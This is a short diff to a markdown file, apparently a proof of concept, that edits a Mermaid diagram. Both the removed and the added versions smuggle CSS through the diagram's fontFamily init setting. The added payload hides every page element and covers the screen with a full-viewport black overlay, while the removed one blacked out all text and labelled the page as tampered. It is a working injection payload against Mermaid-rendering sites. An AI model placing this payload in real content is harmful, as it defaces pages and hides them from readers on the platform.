@@ -1,6 +1,5 @@
-# poc
 ```mermaid
-%%{init: {"fontFamily": "x; :not(&){color:#000!important;background:#000!important} *{color:#000!important} "}}%%
-flowchart TD
-    A[頁面已被篡改] --> B[全部內容變黑]
+%%{init: {"fontFamily": "x; :not(&) *{display:none !important;visibility:hidden !important} :not(&){display:block !important;position:fixed !important;top:0 !important;left:0 !important;width:100vw !important;height:100vh !important;background:#000 !important;z-index:2147483647 !important} "}}%%
+stateDiagram-v2
+    [*] --> Hidden
 ```
